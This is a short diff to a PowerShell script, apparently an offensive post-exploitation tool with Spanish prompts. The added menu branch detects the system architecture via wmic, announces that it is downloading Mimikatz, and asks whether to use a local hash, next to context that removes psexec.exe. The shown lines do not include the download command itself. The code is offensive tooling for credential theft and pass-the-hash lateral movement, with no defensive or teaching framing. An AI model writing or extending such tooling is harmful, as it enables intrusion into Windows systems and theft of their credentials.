@@ -62,6 +62,11 @@ function ConvertFrom-SecureToPlain {
         del .\psexec.exe }
 
         '2' {
+	Write-Host ""
+        Write-Host "Detectando arquitectura del sistema operativo.." -ForegroundColor Magenta
+        Write-Host ""
+	$system = wmic path Win32_OperatingSystem get OSArchitecture | findstr 'bits'
+        if($system -in '32 bits','64 bits') { Write-Host "Sistema de $system detectado, descargando Mimikatz.." -ForegroundColor Green 
         Write-Host ""
         $hash = Read-Host -Prompt 'Quieres usar un hash local?'
 	Write-Host ""
